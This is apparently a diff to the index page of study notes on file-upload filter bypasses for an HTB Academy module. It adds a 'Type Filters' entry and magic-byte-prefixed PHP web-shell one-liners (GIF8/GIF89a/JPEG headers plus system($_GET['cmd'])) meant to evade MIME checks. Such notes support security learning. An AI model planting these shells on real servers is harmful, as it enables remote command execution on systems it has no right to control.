@@ -9,6 +9,7 @@
 - **[Client-Side Validation](./client-side-validation.md)** - Bypassing JavaScript-based frontend filtering
 - **[Blacklist Filters](./blacklist-filters.md)** - Extension fuzzing and blacklist bypass techniques
 - **[Basic Bypass Techniques](./basic-bypass-techniques.md)** - Whitelist bypasses, double extensions, character injection
+- **[Type Filters](./type-filters.md)** - Content-Type manipulation and MIME-Type magic bytes bypass
 - **[Advanced Bypass Methods](./advanced-bypass-methods.md)** - Complex filtering evasion techniques
 - **[Other Upload Attacks](./other-upload-attacks.md)** - Alternative attack vectors and techniques
 
@@ -71,7 +72,8 @@ Content-Type: image/png     # Bypass MIME filtering
 Content-Type: image/gif     # Image masquerading
 
 # Magic Bytes (File Signature)
-GIF89a<?php system($_GET['cmd']); ?>    # GIF header + PHP
+GIF8<?php system($_GET['cmd']); ?>      # Simple GIF header + PHP  
+GIF89a<?php system($_GET['cmd']); ?>    # Full GIF header + PHP
 \xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>    # JPEG header + PHP
 ```
 
@@ -80,8 +82,9 @@ GIF89a<?php system($_GET['cmd']); ?>    # GIF header + PHP
 - ✅ **Client-Side Validation (Page 4)** - Burp Suite interception, DevTools manipulation
 - ✅ **Blacklist Filters (Page 5)** - Extension fuzzing, .phtml bypass, case sensitivity
 - ✅ **Whitelist Filters (Page 6)** - Double extensions, character injection, null bytes
+- ✅ **Type Filters (Page 7)** - Content-Type headers, MIME-Type magic bytes (GIF8), combined attacks
 - ✅ **Complete Lab Solutions** - All HTB Academy flags and step-by-step walkthroughs
-- ✅ **Advanced Techniques** - Server misconfigurations, automated wordlist generation
+- ✅ **Advanced Techniques** - Server misconfigurations, automated wordlist generation, polyglot files
 
 ---
 
